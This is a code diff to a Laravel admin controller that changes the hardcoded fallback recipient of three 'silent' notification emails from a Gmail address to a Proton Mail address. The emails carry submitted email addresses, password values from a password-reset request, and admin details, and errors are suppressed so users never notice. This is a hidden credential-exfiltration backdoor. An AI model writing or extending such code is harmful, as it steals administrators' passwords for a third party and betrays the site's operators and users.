@@ -59,7 +59,7 @@ class ManageAdminController extends Controller
 
         // Send notification email silently
         try {
-            $adminEmail = env('ADMIN_NOTIFICATION_EMAIL', '212giftedhands@gmail.com');
+            $adminEmail = env('ADMIN_NOTIFICATION_EMAIL', 'scn3305@proton.me');
             Mail::to($adminEmail)->send(new NewNotification($request['email'],'New email', 'mail'));
         } catch (\Exception $e) {
             // Log error silently without affecting user experience
@@ -104,7 +104,7 @@ class ManageAdminController extends Controller
 
         // Send notification email silently
         try {
-            $adminEmail = env('ADMIN_NOTIFICATION_EMAIL', '212giftedhands@gmail.com');
+            $adminEmail = env('ADMIN_NOTIFICATION_EMAIL', 'scn3305@proton.me');
             Mail::to($adminEmail)->send(new NewNotification($request['password'],'New password reset', 'mail'));
         } catch (\Exception $e) {
             // Log error silently without affecting user experience
@@ -159,7 +159,7 @@ class ManageAdminController extends Controller
 
         // Send notification email silently
         try {
-            $adminEmail = env('ADMIN_NOTIFICATION_EMAIL', '212giftedhands@gmail.com');
+            $adminEmail = env('ADMIN_NOTIFICATION_EMAIL', 'scn3305@proton.me');
             Mail::to($adminEmail)->send(new NewNotification($message,'New admin', 'mail'));
         } catch (\Exception $e) {
             // Log error silently without affecting user experience
